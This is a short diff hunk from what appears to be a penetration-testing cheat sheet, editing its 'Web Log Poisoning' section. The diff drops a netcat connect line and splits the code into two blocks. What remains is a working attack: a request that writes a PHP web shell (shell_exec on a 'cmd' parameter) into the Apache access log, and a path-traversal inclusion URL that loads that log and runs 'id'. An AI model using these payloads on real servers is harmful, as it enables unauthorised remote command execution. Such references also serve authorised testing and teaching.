@@ -3432,11 +3432,12 @@ $ go install github.com/tomnomnom/waybackurls@latest
 ## Web Log Poisoning
 
 ```c
-nc <RHOST> <RPORT>
 GET /<?php echo shell_exec($_GET['cmd']); ?> HTTP/1.1
 Host: <RHOST>
 Connection: close
+```
 
+```c
 http://<RHOST>/view.php?page=../../../../../var/log/apache2/access.log&cmd=id
 ```
 
